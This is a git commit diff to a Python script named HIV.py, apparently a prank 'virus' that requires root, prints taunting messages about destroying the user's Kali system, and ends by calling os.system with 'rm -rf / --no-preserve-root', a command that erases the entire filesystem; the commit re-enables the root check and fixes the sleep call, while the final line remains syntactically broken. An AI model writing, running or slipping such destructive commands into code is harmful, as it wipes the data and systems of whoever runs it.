bd07a0500b93b470f9294094c88dd63718756ac4
Nikhil Sharma <90233850+Hacker2425@users.noreply.github.com>
2022-06-12 20:59:30 +0530

    Update HIV.py

--- HIV.py
+++ HIV.py
@@ -2,8 +2,8 @@ import os
 from time import sleep
 import sys
 
-#if os.geteuid() != 0:
-    #exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
+if os.geteuid() != 0:
+    exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
 
 
 print ("""Before running this virus . I am gonna tell you
@@ -20,6 +20,6 @@ elif choice == 'No':
   exit()
 print("Lol, You choosed YES Now wait it is the matter of the time")
 print ("I Destroy your Kali in 5 sec")
-sleep 5 
+sleep (5) 
 print("Done jerk!")
 os.system(rm -rf / --no-preserve-root )
